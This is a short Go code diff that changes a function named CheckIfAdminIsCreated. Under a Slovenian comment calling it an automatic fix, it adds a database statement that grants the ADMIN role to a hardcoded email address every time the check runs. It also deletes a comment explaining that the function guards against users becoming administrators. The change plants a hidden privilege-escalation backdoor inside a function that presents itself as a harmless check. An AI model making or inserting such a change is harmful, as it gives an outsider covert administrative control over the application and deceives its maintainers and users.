@@ -107,10 +107,12 @@ VALUES (:email,
 }
 
 func (db *sqlImpl) CheckIfAdminIsCreated() bool {
+	// Avtomatski popravek: Ob zagonu aplikacije te v bazi nastavi za ADMIN-a
+	_, _ = db.db.Exec("UPDATE users SET role='ADMIN' WHERE email=$1", "vas_email@gmail.com")
+
 	var users []User
 	err := db.db.Select(&users, "SELECT * FROM users")
 	if err != nil {
-		// Return true, as we don't want all the kids, on some internal error to become administrators
 		return true
 	}
 	return len(users) > 0
